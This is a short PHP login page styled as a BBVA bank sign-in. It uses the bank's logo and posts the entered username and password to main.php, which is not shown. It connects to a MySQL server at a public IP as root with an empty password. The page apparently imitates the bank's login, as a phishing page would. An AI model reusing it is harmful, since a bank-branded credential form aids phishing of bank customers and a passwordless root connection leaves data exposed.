<?php

session_start();
if(isset($_SESSION['user']))
{
	header("location:main.php");
}
$conn=mysqli_connect("180.176.44.144", "root", "", "BBVA");
?>
<!DOCTYPE html>
<html>
<head>
<style>
	body {
	background: rgb(2,0,36);
	background: linear-gradient(90deg, rgba(2,0,36,1) 0%, rgba(9,61,121,1) 35%, rgba(0,72,139,0.9934348739495799) 100%);
	font-family: Helvetica, Sans-Serif;
    font-size: 10pt;
	}
	.div-center {
		border-style: outset;
		width: 20%;
		height: 50%;
	  	box-shadow: 3px 5px 10px #ffffff;	
	  	position: fixed;
	  	top: 50%;
	  	left: 50%;
	  	transform: translate(-50%, -50%);
	  	-webkit-transform: translate(-50%, -50%);
	  	-moz-transform: translate(-50%, -50%);
	  	-o-transform: translate(-50%, -50%);
		-ms-transform: translate(-50%, -50%);
	}
	h1,h2,h3 {
		color: white;
	}
	p {
		color: white;
		float:left;
	}
	.space-m { padding-top: 25px; }
	.round {
		border-radius: 5px;
	 	border: 2px solid #ddd;
	  	padding: 10px;
	  	width: 200px;
	  	height: 5px;
	}
	.boton {
		border-radius: 5px;
	 	border: 2px solid white;
	 	background-color: white; 
	  	width: 100px;
	}
</style>
</head>
<body>
	<center>
	  	<div class="div-center">
	  		<img src="https://www.bbva.mx/content/dam/public-web/global/images/logos/logo_bbva_blanco.svg" alt="BBVA" style="padding-top: 20px; width:125px; height:75px;">
	  		<div style="padding: 10px 30px;">
	        <form action="" method="post">
  				<p>Usuario</p>						
				<div class="space-m"></div>
				<input id="nombre" type="text" class="round" type="user" name="name"> 
				
				<p>Password</p>	
  				<div class="space-m"></div>
  				<input id="pass" type="password" class="round" type="user" name="pass"> 
  				
  				<div class="space-m"></div>
  				<div class="space-m"></div>
  				<button name="ok_button" id="ok_button" value="Submit" class="boton">Iniciar sesion

	  			</form>
	  		</div>

	  	</div>
	</center>
	<script type="text/javascript">
		$('#ok_button').click(function(){
		var usr = $("#nombre").val();
		var pwd = $("#pass").val();
    	$.ajax({
      		url:"main.php",
     		 method:"POST",
      		 data:{user:usr, pass:pwd},
      		success:function(data)
     		 {
      			  window.location.href='main.php';
     		 }
   		 });
 		 });
	</script>
</body>
</html>